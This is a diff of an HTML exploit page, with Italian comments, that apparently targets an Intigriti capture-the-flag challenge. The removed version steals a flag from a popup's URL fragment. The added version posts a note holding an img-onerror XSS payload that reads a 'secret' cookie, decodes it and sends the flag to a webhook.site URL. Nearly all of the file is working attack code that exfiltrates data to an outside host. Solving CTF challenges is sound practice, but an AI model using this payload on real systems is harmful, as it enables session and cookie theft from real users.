@@ -1,26 +1,269 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Leaky Flagment XSS Exploit</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(to right, #ee9ca7, #ffdde1);
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            padding: 30px;
+            max-width: 600px;
+            width: 90%;
+            text-align: center;
+        }
+        h1 {
+            margin-bottom: 20px;
+            color: #444;
+        }
+        .status {
+            padding: 10px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-style: italic;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        .button {
+            background-color: #ee9ca7;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+            margin-top: 20px;
+        }
+        .button:hover {
+            background-color: #e67c8f;
+        }
+        .button:disabled {
+            background-color: #f8d7da;
+            cursor: not-allowed;
+        }
+        textarea {
+            width: 100%;
+            height: 150px;
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            font-family: monospace;
+            resize: vertical;
+        }
+        .log {
+            max-height: 150px;
+            overflow-y: auto;
+            background-color: #f8f9fa;
+            border: 1px solid #eee;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 20px 0;
+            text-align: left;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .note-url {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #f5f5f5;
+            border-radius: 5px;
+            font-family: monospace;
+            word-break: break-all;
+        }
+    </style>
+</head>
 <body>
-  <button onclick="run()">Test & Leak</button>
-  <script>
-    async function run() {
-      // 1️⃣ Test di connessione al webhook
-      await fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?test=ok');
+    <div class="container">
+        <h1>Leaky Flagment XSS Exploit</h1>
+        <p>Questo exploit crea una nota malevola per rubare la flag dal bot.</p>
+        
+        <div id="statusMessage" class="status info">Pronto per creare la nota malevola</div>
+        
+        <div>
+            <h3>Payload XSS (modificabile)</h3>
+            <textarea id="xssPayload"></textarea>
+        </div>
+        
+        <div id="noteUrlContainer" style="display: none;">
+            <h3>URL della nota creata</h3>
+            <div id="noteUrl" class="note-url"></div>
+            <p>Invia questo URL al bot per ottenere la flag</p>
+        </div>
+        
+        <div id="log" class="log"></div>
+        
+        <button id="createNoteButton" class="button">Crea Nota Malevola</button>
+    </div>
 
-      // 2️⃣ Apri popup per catturare il fragment con FLAG
-      const child = window.open('https://challenge-0325.intigriti.io/note/00000000-0000-0000-0000-000000000000');
-      const interval = setInterval(() => {
-        try {
-          const hash = child.location.hash;
-          if (hash.startsWith('#:')) {
-            clearInterval(interval);
-            const flag = atob(hash.slice(2)).split(':')[1];
-            fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + encodeURIComponent(flag));
-            child.close();
-          }
-        } catch {}
-      }, 200);
-    }
-  </script>
+    <script>
+        // Elementi DOM
+        const statusMessage = document.getElementById('statusMessage');
+        const xssPayloadTextarea = document.getElementById('xssPayload');
+        const createNoteButton = document.getElementById('createNoteButton');
+        const logContainer = document.getElementById('log');
+        const noteUrlContainer = document.getElementById('noteUrlContainer');
+        const noteUrlElement = document.getElementById('noteUrl');
+        
+        // URL del webhook dove inviare la flag
+        const webhookUrl = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a';
+        
+        // Payload XSS predefinito
+        const defaultXssPayload = `<img src=x onerror="
+            const extractFlag = () => {
+                try {
+                    // Ottiene il secret cookie
+                    const cookie = document.cookie.split(';').find(c => c.trim().startsWith('secret='));
+                    if (!cookie) {
+                        console.error('Cookie non trovato');
+                        return;
+                    }
+                    
+                    // Decodifica il cookie
+                    const secretValue = cookie.split('=')[1].trim();
+                    const decodedSecret = atob(secretValue);
+                    console.log('Secret decodificato:', decodedSecret);
+                    
+                    // Estrae la flag (parte dopo i due punti)
+                    const colonIndex = decodedSecret.indexOf(':');
+                    if (colonIndex === -1) {
+                        console.error('Formato cookie non valido');
+                        return;
+                    }
+                    
+                    const flag = decodedSecret.substring(colonIndex + 1);
+                    console.log('Flag trovata:', flag);
+                    
+                    // Invia la flag al webhook
+                    const img = new Image();
+                    img.src = '${webhookUrl}?flag=' + encodeURIComponent(flag);
+                    document.body.appendChild(img);
+                    
+                    console.log('Flag inviata al webhook');
+                } catch (error) {
+                    console.error('Errore:', error);
+                }
+            };
+            
+            // Esegue l'estrazione dopo un breve ritardo
+            setTimeout(extractFlag, 500);
+        ">`;
+        
+        // Funzione per aggiungere un messaggio al log
+        function addToLog(message, isError = false) {
+            const logEntry = document.createElement('div');
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            if (isError) {
+                logEntry.style.color = '#dc3545';
+            }
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            console.log(message);
+        }
+        
+        // Funzione per aggiornare lo stato
+        function updateStatus(message, type = 'info') {
+            statusMessage.textContent = message;
+            statusMessage.className = `status ${type}`;
+            addToLog(message, type === 'error');
+        }
+        
+        // Funzione per creare una nota malevola
+        async function createMaliciousNote() {
+            updateStatus('Creazione della nota malevola in corso...', 'info');
+            createNoteButton.disabled = true;
+            
+            try {
+                // Ottiene il payload XSS
+                const xssPayload = xssPayloadTextarea.value.trim();
+                if (!xssPayload) {
+                    updateStatus('Il payload XSS non può essere vuoto', 'error');
+                    createNoteButton.disabled = false;
+                    return;
+                }
+                
+                // Crea la nota malevola
+                const response = await fetch('https://challenge-0325.intigriti.io/api/post', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': '*/*'
+                    },
+                    body: JSON.stringify({
+                        title: 'Documento Importante',
+                        content: xssPayload,
+                        use_password: 'false'
+                    })
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Errore nella creazione della nota: ${response.status} ${response.statusText}`);
+                }
+                
+                const data = await response.json();
+                addToLog('Risposta del server:', false);
+                addToLog(JSON.stringify(data), false);
+                
+                if (data.id) {
+                    updateStatus('Nota malevola creata con successo!', 'success');
+                    
+                    // Mostra l'URL della nota
+                    const noteUrl = `https://challenge-0325.intigriti.io/note/${data.id}`;
+                    noteUrlElement.textContent = noteUrl;
+                    noteUrlContainer.style.display = 'block';
+                    
+                    // Crea anche un link per la versione view_protected_note
+                    addToLog('URL alternativo (view_protected_note):', false);
+                    addToLog(`https://challenge-0325.intigriti.io/view_protected_note?id=${data.id}`, false);
+                    
+                    // Invia un ping al webhook per notificare la creazione della nota
+                    fetch(`${webhookUrl}?event=note_created&id=${data.id}&time=${Date.now()}`);
+                } else {
+                    updateStatus('Creazione della nota riuscita, ma ID non trovato nella risposta', 'error');
+                }
+            } catch (error) {
+                updateStatus(`Errore: ${error.message}`, 'error');
+                addToLog(error.stack, true);
+            } finally {
+                createNoteButton.disabled = false;
+            }
+        }
+        
+        // Inizializzazione
+        window.onload = function() {
+            // Imposta il payload XSS predefinito
+            xssPayloadTextarea.value = defaultXssPayload;
+            
+            // Registra il listener per il pulsante
+            createNoteButton.addEventListener('click', createMaliciousNote);
+            
+            // Log iniziale
+            addToLog('Exploit inizializzato. Pronto per creare la nota malevola.');
+            addToLog('Webhook configurato: ' + webhookUrl);
+        };
+    </script>
 </body>
 </html>
